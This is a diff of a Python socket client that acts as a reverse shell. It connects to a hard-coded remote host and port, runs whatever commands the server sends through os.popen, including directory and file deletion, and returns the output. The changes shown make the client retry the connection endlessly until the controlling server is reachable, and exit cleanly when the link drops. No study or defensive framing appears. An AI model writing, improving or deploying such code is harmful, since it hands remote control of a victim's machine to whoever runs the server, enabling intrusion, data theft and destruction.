@@ -2,20 +2,19 @@ import socket
 import subprocess
 import re
 import os
-from sys import platform
+from sys import platform, exit
 from shutil import rmtree
 import colorama
 
 colorama.init(autoreset=True)
 
 s = socket.socket()
-HOST = "192.168.1.30"
-PORT = 5051
+HOST = "192.168.1.1"
+PORT = 5052
 SERVER = (HOST, PORT)
 FORMAT = "utf-8"
 BUFFER = 8192
 DC_MSG = "!dc"
-s.connect(SERVER)
 
 def getPWD():
     pwd = f'{colorama.Back.BLACK}{colorama.Fore.YELLOW}{os.getcwd()}{colorama.Back.RESET}{colorama.Fore.RESET}'
@@ -38,7 +37,22 @@ elif platform == "win32":
     cmdList["rmDir"] = "rmdir /S"
     cmdList["rmFile"] = "del"
     cmdList["echo"] = "echo"
+
+connected = False
+
+while not connected:
+    try:
+        s.connect(SERVER)
+        connected = True
+    except socket.error:
+        continue
+
+        ## For exiting if server is offline
+        # print("Server is offline.")
+        # exit(1)
     
+
+
 run = True
 while run:
     cmd = s.recv(BUFFER).decode(FORMAT)
@@ -102,5 +116,8 @@ while run:
         else:
             os.popen(cmd)
             s.send(f"Get command: {cmd}".encode(FORMAT))
+    except ConnectionAbortedError:
+        print("Connection error, server might be offline!")
+        exit(1)
     except:
         s.send(f"Error from command: {colorama.Fore.RED}{cmd}{colorama.Fore.RESET}".encode(FORMAT))
